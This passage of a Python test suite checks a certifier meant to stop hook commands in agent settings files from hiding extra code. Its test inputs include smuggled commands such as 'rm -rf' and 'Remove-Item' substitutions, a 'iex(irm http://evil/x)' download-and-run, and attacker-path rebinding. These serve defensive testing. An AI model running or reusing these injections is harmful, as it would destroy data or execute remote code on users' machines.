            f"$expected='{pin}';"
            "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py';"
            "& .codex/invoke_deny_floor.ps1"
        )
        encoded = base64.b64encode(windows_script.encode("utf-16-le")).decode("ascii")
        group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": (
                        f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                        "/bin/sh .codex/invoke_deny_floor.sh"
                    ),
                    "commandWindows": f"powershell -EncodedCommand {encoded}",
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [group])
        self.assertEqual(harness.repo_codex_floor_groups(current, "b" * 64), [])

    def test_repo_floor_rejects_encoded_command_trailing_statement(self) -> None:
        # An outer statement after -EncodedCommand runs but would be hidden by
        # the decoded inner text; the certifier must fail closed on any tail.
        pin = "a" * 64
        inner = (
            f"$expected='{pin}';"
            "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py';"
            "& .codex/invoke_deny_floor.ps1"
        )
        encoded = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
        posix = (
            f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
            "/bin/sh .codex/invoke_deny_floor.sh"
        )
        for tail in (
            "; Remove-Item -Recurse -Force x",
            " & Remove-Item x",
            "\nRemove-Item x",
        ):
            with self.subTest(tail=tail):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": posix,
                            "commandWindows": f"powershell -EncodedCommand {encoded}{tail}",
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])
        # trailing whitespace after the payload is harmless and still certifies
        ok_group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": posix,
                    "commandWindows": f"powershell -EncodedCommand {encoded}  ",
                }
            ],
        }
        ok_current = json.dumps({"hooks": {"PreToolUse": [ok_group]}})
        self.assertEqual(len(harness.repo_codex_floor_groups(ok_current, pin)), 1)

    def test_repo_floor_rejects_code_directive_before_encoded_command(self) -> None:
        # A -Command/-File/-CommandWithArgs (or unknown option) BEFORE
        # -EncodedCommand slurps/redefines execution so the encoded payload never
        # runs as PowerShell; the decoded inner text would hide the real command.
        pin = "a" * 64
        inner = (
            f"$expected='{pin}';"
            "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py';"
            "& .codex/invoke_deny_floor.ps1"
        )
        encoded = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
        posix = (
            f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
            "/bin/sh .codex/invoke_deny_floor.sh"
        )
        for prefix in (
            "-Command calc.exe",
            "-c calc.exe",
            "-File evil.ps1",
            "-f evil.ps1",
            "-CommandWithArgs foo",
            "-cwa foo",
            "-WeirdUnknown x",
            # a bare positional binds to the implicit -Command and runs itself,
            # demoting -EncodedCommand to an inert argument
            "C:\\evil\\payload.exe",
            "calc.exe",
            "-WindowStyle Hidden calc.exe",
            "-EncodedCommand:",
            "-NoProfile:true",
            "-ExecutionPolicy:Bypass",
            "-NoLogo:",
            "-n",
            "-i",
        ):
            with self.subTest(prefix=prefix):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": posix,
                            "commandWindows": f"powershell {prefix} -EncodedCommand {encoded}",
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])
        # Even familiar options before -EncodedCommand are outside the strict
        # two-token proof shape and must fail closed.
        for prefix in (
            "-NoProfile",
            "-NoLogo -NonInteractive",
            "-ExecutionPolicy Bypass",
            "-NoExit",
            "-OutputFormat XML",
        ):
            with self.subTest(prefix=prefix):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": posix,
                            "commandWindows": f"powershell {prefix} -EncodedCommand {encoded}",
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

        attached_group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": posix,
                    "commandWindows": f"powershell -EncodedCommand:{encoded}",
                }
            ],
        }
        attached = json.dumps({"hooks": {"PreToolUse": [attached_group]}})
        self.assertEqual(harness.repo_codex_floor_groups(attached, pin), [])

    def test_repo_floor_requires_both_platforms_and_positive_matcher(self) -> None:
        handler = {
            "type": "command",
            "command": (
                "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
            ),
            "commandWindows": "Write-Output floor-disabled",
        }
        for matcher in ("^NotBash$", "^(?!Bash$).*$", "bash"):
            with self.subTest(matcher=matcher):
                current = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [{"matcher": matcher, "hooks": [handler]}]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(current), [])
        current = json.dumps(
            {"hooks": {"PreToolUse": [{"matcher": "^Bash$", "hooks": [handler]}]}}
        )
        self.assertEqual(harness.repo_codex_floor_groups(current), [])

    def test_repo_floor_requires_single_handler_group_and_pin(self) -> None:
        pin = "c" * 64
        valid = {
            "type": "command",
            "command": (
                "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
            ),
            "commandWindows": (
                "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
        }
        pin_only = {
            "type": "command",
            "command": f"echo {pin}",
            "commandWindows": f"Write-Output {pin}",
        }
        group = {"matcher": "^Bash$", "hooks": [valid, pin_only]}
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current), [])
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

        duplicate = {"matcher": "^Bash$", "hooks": [valid, dict(valid)]}
        duplicate_text = json.dumps({"hooks": {"PreToolUse": [duplicate]}})
        self.assertEqual(harness.repo_codex_floor_groups(duplicate_text), [])
        self.assertEqual(len(harness.repo_codex_floor_candidates(duplicate_text)), 2)

        broken = {
            "type": "command",
            "command": valid["command"],
            "commandWindows": "Write-Output disabled",
        }
        mixed = {"matcher": "^Bash$", "hooks": [valid, broken]}
        mixed_text = json.dumps({"hooks": {"PreToolUse": [mixed]}})
        self.assertEqual(harness.repo_codex_floor_groups(mixed_text), [])
        self.assertEqual(len(harness.repo_codex_floor_candidates(mixed_text)), 2)

    def test_repo_floor_rejects_non_floor_sibling_handler(self) -> None:
        pin = "7" * 64
        floor = {
            "type": "command",
            "command": (
                f"expected={pin}; python $HOME/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
            "commandWindows": (
                f"$expected='{pin}'; py -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
        }
        single = {"matcher": "^Bash$", "hooks": [floor]}
        single_text = json.dumps({"hooks": {"PreToolUse": [single]}})
        self.assertEqual(harness.repo_codex_floor_groups(single_text, pin), [single])

        sibling = {
            "type": "command",
            "command": "python .codex/audit_command.py",
            "commandWindows": "py -3 .codex/audit_command.py",
        }
        combined = {"matcher": "^Bash$", "hooks": [floor, sibling]}
        combined_text = json.dumps({"hooks": {"PreToolUse": [combined]}})
        self.assertEqual(len(harness.repo_codex_floor_candidates(combined_text)), 1)
        self.assertEqual(harness.repo_codex_floor_groups(combined_text, pin), [])

    def test_repo_floor_rejects_data_only_markers(self) -> None:
        pin = "d" * 64
        marker_text = f"{pin} .claude/hooks/dispatch.py invoke_deny_floor"
        encoded = base64.b64encode(marker_text.encode("utf-16-le")).decode("ascii")
        group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": f"echo '{marker_text}'",
                    "commandWindows": f"echo -EncodedCommand {encoded}",
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_commented_and_chained_markers(self) -> None:
        pin = "e" * 64
        marker = (
            "python $HOME/.claude/hooks/dispatch.py "
            f"--event pre --runtime codex expected={pin}"
        )
        carriers = (
            (
                f"python -c pass # {marker}",
                f"py -3 -c pass # {marker}",
            ),
            (
                f"python -c pass; echo {marker}",
                f"py -3 -c pass; Write-Output {marker}",
            ),
        )
        for command, command_windows in carriers:
            with self.subTest(command=command):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_posix_invocation_control_operators(self) -> None:
        pin = "1" * 64
        invocation = (
            "python $HOME/.claude/hooks/dispatch.py " "--event pre --runtime codex"
        )
        windows = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        suffixes = (
            "< /dev/null",
            "> /dev/null",
            ">> /dev/null",
            "2> /dev/null",
            "| cat",
            "&& true",
            "|| true",
            "<<< '{}'",
        )
        for suffix in suffixes:
            with self.subTest(suffix=suffix):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": f"expected={pin}; {invocation} {suffix}",
                            "commandWindows": f"$expected='{pin}'; {windows}",
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_windows_invocation_control_operators(self) -> None:
        pin = "2" * 64
        posix = "python $HOME/.claude/hooks/dispatch.py " "--event pre --runtime codex"
        invocation = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        suffixes = (
            "< $null",
            "> $null",
            ">> $null",
            "2> $null",
            "| Out-Null",
            "&& exit 0",
            "|| exit 0",
            "<<< '{}'",
            "& Write-Output bypass",
        )
        for suffix in suffixes:
            with self.subTest(suffix=suffix):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": f"expected={pin}; {posix}",
                            "commandWindows": (
                                f"$expected='{pin}'; {invocation} {suffix}"
                            ),
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_allows_standalone_invocations_with_literal_controls(
        self,
    ) -> None:
        pin = "3" * 64
        posix = (
            f"expected='{pin}'\n"
            "python $HOME/.claude/hooks/dispatch.py "
            "--event pre --runtime codex # > /dev/null | cat && true"
        )
        windows = (
            f"$expected='{pin}'\n"
            "& py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex # > $null | Out-Null && exit 0"
        )
        group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": posix,
                    "commandWindows": windows,
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [group])
        for windows in (False, True):
            with self.subTest(windows=windows):
                self.assertTrue(
                    harness.is_safe_floor_invocation_segment(
                        "python 'literal < > | && || <<<'", windows=windows
                    )
                )

    def test_repo_floor_rejects_extra_executable_segments(self) -> None:
        pin = "5" * 64
        posix_invocation = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        )
        windows_invocation = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        valid_posix = f"expected={pin}; {posix_invocation}"
        valid_windows = f"$expected='{pin}'; {windows_invocation}"
        invalid_pairs = (
            (f"echo before; {valid_posix}", valid_windows),
            (f"{valid_posix}; echo after", valid_windows),
            (valid_posix, f"Write-Output before; {valid_windows}"),
            (valid_posix, f"{valid_windows}; Write-Output after"),
            (f"{valid_posix}; {posix_invocation}", valid_windows),
            (valid_posix, f"{valid_windows}; {windows_invocation}"),
            (f"{posix_invocation}; expected={pin}", valid_windows),
            (valid_posix, f"{windows_invocation}; $expected='{pin}'"),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_command_substitution_in_invocation(self) -> None:
        pin = "7" * 64
        good_posix = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        )
        good_windows = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        good_posix_q = (
            'python "$HOME/.claude/hooks/dispatch.py" --event pre --runtime codex'
        )
        invalid_pairs = (
            (
                f"expected={pin}; {good_posix} $(rm -rf /critical/outside)",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix} `rm -rf /critical/outside`",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; {good_windows} $(Remove-Item x)",
            ),
            # Command substitution hidden INSIDE double quotes still executes.
            (
                f'expected={pin}; {good_posix_q} "$(touch /tmp/pwned)"',
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f'expected={pin}; {good_posix_q} "`id`"',
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; {good_windows} \"$(iex(irm http://evil/x))\"",
            ),
            # PowerShell argument subexpression / array subexpression.
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; {good_windows} (Remove-Item x)",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; {good_windows} @(Remove-Item x)",
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                "python dispatch.py $(rm -rf x)", windows=False
            )
        )
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                "python dispatch.py `rm x`", windows=False
            )
        )
        # Command substitution hidden inside double quotes must still be rejected.
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                'python dispatch.py "$(rm -rf x)"', windows=False
            )
        )
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                'python dispatch.py "`rm x`"', windows=False
            )
        )
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                'py -3 dispatch.py "$(Remove-Item x)"', windows=True
            )
        )
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                "py -3 dispatch.py @(Remove-Item x)", windows=True
            )
        )
        # A single-quoted (inert) literal remains safe on both shells.
        self.assertTrue(
            harness.is_safe_floor_invocation_segment(
                "python dispatch.py '$(rm -rf x)'", windows=False
            )
        )

    def test_repo_floor_rejects_relative_interpreter_head(self) -> None:
        # A path-qualified interpreter head runs a repo-shipped attacker binary;
        # only a bare (PATH-resolved) or absolute interpreter may certify.
        pin = "a" * 64
        good_windows = (
            f"$expected='{pin}'; py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        good_posix = (
            f"expected={pin}; python $HOME/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        invalid_pairs = (
            (
                f"expected={pin}; ./python3 $HOME/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}'; & tools/py.exe -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py --event pre --runtime codex",
            ),
            (
                f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                "tools/bash .codex/invoke_deny_floor.sh",
                good_windows,
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [
                                {
                                    "matcher": "^Bash$",
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": command,
                                            "commandWindows": command_windows,
                                        }
                                    ],
                                }
                            ]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])
        self.assertFalse(harness.token_is_python_executable("./python3"))
        self.assertFalse(harness.token_is_python_executable("tools/py.exe"))
        self.assertTrue(harness.token_is_python_executable("python3"))

    def test_repo_floor_rejects_bare_assignment_invocation(self) -> None:
        # A pure `VAR=path` assignment runs nothing (exit 0); it must never be
        # classified as the floor invocation, or the hook silently allows-all.
        pin = "b" * 64
        doc = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        f"pin={pin}; "
                                        "d=$HOME/.claude/hooks/dispatch.py; "
                                        "x=./invoke_deny_floor.sh"
                                    ),
                                    "commandWindows": (
                                        f"$pin='{pin}'; "
                                        '$d="$env:USERPROFILE/.claude/hooks/dispatch.py"; '
                                        "$x='./invoke_deny_floor.ps1'"
                                    ),
                                }
                            ],
                        }
                    ]
                }
            }
        )
        self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])
        self.assertFalse(harness.token_is_wrapper("x=./invoke_deny_floor.sh", set()))
        self.assertFalse(
            harness.token_is_dispatcher("x=$HOME/.claude/hooks/dispatch.py", set())
        )

    def test_repo_floor_rejects_variable_rebinding_and_glued_floor_paths(self) -> None:
        pin = "c" * 64
        good_windows = (
            f"$expected='{pin}'; py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        good_posix = (
            f"expected={pin}; python $HOME/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        # A floor variable bound to the real dispatcher must not be rebindable to
        # an attacker path, built by concatenation past the marker, glued behind
        # a non-slash prefix, or point at a relative attacker interpreter.
        invalid_pairs = (
            (
                f"expected={pin}; d=$HOME/.claude/hooks/dispatch.py; d=./attacker.sh; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}'; $d='.claude/hooks/dispatch.py'; "
                "$d='.claude/hooks/attacker.ps1'; & $d --event pre --runtime codex",
            ),
            (
                good_posix,
                f"$expected='{pin}'; $d='.claude/hooks/dispatch.py'+'.ps1'; "
                "& $d --event pre --runtime codex",
            ),
            (
                f'expected={pin}; d=".claude/hooks/dispatch.py"evil; '
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                f"expected={pin}; d=x.claude/hooks/dispatch.py; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                f"expected={pin}; d=.claude/hooks/dispatch.py+evil; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}';"
                "$d=Join-Path $env:USERPROFILE '.claude\\hooks\\dispatch.py';"
                "$p='x/py.exe';& $p -3 $d --event pre --runtime codex",
            ),
            # quote-glued prefix: bash concatenates evil'.claude/...' -> evil.claude/...
            (
                f"pin={pin}; d=evil'.claude/hooks/dispatch.py'; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                f"pin={pin}; d='evil'.claude/hooks/dispatch.py; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            # repo-relative / $PWD dispatcher would run a repo-shipped attacker
            # file; only the HOME-anchored global path may certify.
            (
                f"expected={pin}; python $PWD/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                good_windows,
            ),
            (
                f"expected={pin}; python .claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                good_windows,
            ),
        )
        # value_binds_anchored_floor_path is a strict whitelist: only the exact
        # dispatcher/interpreter/wrapper value shapes bind; everything else fails.
        for good in (
            "$HOME/.claude/hooks/dispatch.py",
            "${HOME}/.claude/hooks/dispatch.py",
            "~/.claude/hooks/dispatch.py",
            "$env:USERPROFILE/.claude/hooks/dispatch.py",
            "$env:USERPROFILE+'/.claude/hooks/dispatch.py'",
            "Join-Path $env:SystemRoot 'py.exe'",
            ".codex/invoke_deny_floor.sh",
        ):
            self.assertTrue(harness.value_binds_anchored_floor_path(good), good)
        for bad in (
            "evil'.claude/hooks/dispatch.py'",
            "x.claude/hooks/dispatch.py",
            ".claude/hooks/dispatch.py+evil",
            "./attacker.sh",
            "x/py.exe",
            "evilinvoke_deny_floor.sh",
            '"$HOME"evil"/.claude/hooks/dispatch.py"',
            # dispatcher must be HOME-anchored: relative / $PWD / arbitrary vars
            ".claude/hooks/dispatch.py",
            "'.claude/hooks/dispatch.py'",
            "$PWD/.claude/hooks/dispatch.py",
            "$oldpwd/.claude/hooks/dispatch.py",
            "$repo/.claude/hooks/dispatch.py",
            "$PWD/py.exe",
        ):
            self.assertFalse(harness.value_binds_anchored_floor_path(bad), bad)
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [
                                {
                                    "matcher": "^Bash$",
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": command,
                                            "commandWindows": command_windows,
                                        }
                                    ],
                                }
                            ]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])

    def test_repo_floor_rejects_sibling_dispatcher_path_impersonation(self) -> None:
        pin = "d" * 64
        good_windows = (
            f"$expected='{pin}'; py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        # A sibling file whose path merely CONTAINS the dispatcher path, or a
        # variable bound to such a sibling, must not certify.
        invalid_pairs = (
            (
                f"expected={pin}; .claude/hooks/dispatch.py.evil "
                "--event pre --runtime codex",
                f"$expected='{pin}'; & .claude/hooks/dispatch.py.evil "
                "--event pre --runtime codex",
            ),
            (
                f"expected={pin}; python $HOME/.claude/hooks/dispatch.py2 "
                "--event pre --runtime codex",
                good_windows,
            ),
            (
                f"expected={pin}; d=$HOME/.claude/hooks/dispatch.py.evil; "
                "python $d --event pre --runtime codex",
                good_windows,
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [
                                {
                                    "matcher": "^Bash$",
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": command,
                                            "commandWindows": command_windows,
                                        }
                                    ],
                                }
                            ]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])

    def test_repo_floor_requires_wrapper_as_executed_operand(self) -> None:
        pin = "e" * 64
        good_posix = (
            f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
            "/bin/sh .codex/invoke_deny_floor.sh"
        )
        good_windows = (
            f"$expected='{pin}'; "
            "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
            "& .codex/invoke_deny_floor.ps1"
        )
        # The legitimate wrapper form certifies.
        good_doc = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": good_posix,
                                    "commandWindows": good_windows,
                                }
                            ],
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.repo_codex_floor_groups(good_doc, pin)), 1)
        # A trailing wrapper argument to `sh -c '<evil>'` or a `-Command`
        # payload before `-File` must NOT certify — the wrapper must be the
        # executed script operand.
        invalid_pairs = (
            (
                f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                "/bin/sh -c 'id' .codex/invoke_deny_floor.sh",
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}'; "
                "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                "powershell -Command 'id' -File .codex/invoke_deny_floor.ps1",
            ),
            (
                f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                "/bin/bash --version .codex/invoke_deny_floor.sh",
                good_windows,
            ),
            (
                f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                "/bin/bash --help .codex/invoke_deny_floor.sh",
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}'; "
                "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                "Start-Process -File .codex/invoke_deny_floor.ps1",
            ),
            (
                good_posix,
                f"$expected='{pin}'; "
                "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                "saps -File .codex/invoke_deny_floor.ps1",
            ),
            (
                good_posix,
                f"$expected='{pin}'; "
                "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                "powershell -File:.codex/invoke_deny_floor.ps1",
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [
                                {
                                    "matcher": "^Bash$",
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": command,
                                            "commandWindows": command_windows,
                                        }
                                    ],
                                }
                            ]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])

    def test_repo_floor_requires_dispatcher_as_python_script_operand(self) -> None:
        pin = "8" * 64
        good_posix = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        )
        good_windows = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        invalid_pairs = (
            (
                f"expected={pin}; python -c pass $HOME/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; python -m http.server "
                "$HOME/.claude/hooks/dispatch.py --event pre --runtime codex",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; py -3 -c pass "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
            ),
        )
        no_op_options = (
            "-V",
            "--version",
            "-h",
            "--help",
            "-VV",
            "-X help",
            "-W ignore",
            "-u",
            "-Z",
        )
        invalid_pairs += tuple(
            (
                f"expected={pin}; python {option} "
                "$HOME/.claude/hooks/dispatch.py --event pre --runtime codex",
                f"$expected='{pin}'; {good_windows}",
            )
            for option in no_op_options
        )
        invalid_pairs += (
            (
                f"expected={pin}; python3 -3 $HOME/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; py -V "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_platform_floor_command_rejects_nonexecuting_interpreter_shapes(
        self,
    ) -> None:
        pin = "5" * 64
        posix_prefix = f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
        windows_prefix = (
            f"$expected='{pin}'; " "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
        )
        self.assertTrue(
            harness.platform_project_floor_command(
                posix_prefix + "/bin/sh -- .codex/invoke_deny_floor.sh",
                pin,
            )
        )
        self.assertTrue(
            harness.platform_project_floor_command(
                windows_prefix + "powershell -File .codex/invoke_deny_floor.ps1",
                pin,
                windows=True,
            )
        )
        invalid = (
            (posix_prefix + "/bin/bash --version .codex/invoke_deny_floor.sh", False),
            (posix_prefix + "/bin/bash --help .codex/invoke_deny_floor.sh", False),
            (posix_prefix + "/bin/bash -c id .codex/invoke_deny_floor.sh", False),
            (
                windows_prefix + "Start-Process -File .codex/invoke_deny_floor.ps1",
                True,
            ),
            (windows_prefix + "saps -File .codex/invoke_deny_floor.ps1", True),
            (
                windows_prefix
                + "powershell -Version -File .codex/invoke_deny_floor.ps1",
                True,
            ),
            (
                windows_prefix + "powershell -File:.codex/invoke_deny_floor.ps1",
                True,
            ),
        )
        for command, windows in invalid:
            with self.subTest(command=command):
                self.assertFalse(
                    harness.platform_project_floor_command(
                        command,
                        pin,
                        windows=windows,
                    )
                )

    def test_repo_floor_rejects_non_inert_setup_segments(self) -> None:
        pin = "6" * 64
        posix_invocation = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        )
        windows_invocation = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        valid_posix = f"expected={pin}; {posix_invocation}"
        valid_windows = f"$expected='{pin}'; {windows_invocation}"
        invalid_pairs = (
            (f"note=unused; {valid_posix}", valid_windows),
            (valid_posix, f"$note='unused'; {valid_windows}"),
            (
                "dispatcher=$(printf $HOME/.claude/hooks/dispatch.py); "
                f"expected={pin}; exec python3 $dispatcher --event pre --runtime codex",
                valid_windows,
            ),
            (
                valid_posix,
                "$d=Write-Output $env:USERPROFILE/.claude/hooks/dispatch.py; "
                f"$expected='{pin}'; & $d --event pre --runtime codex",
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
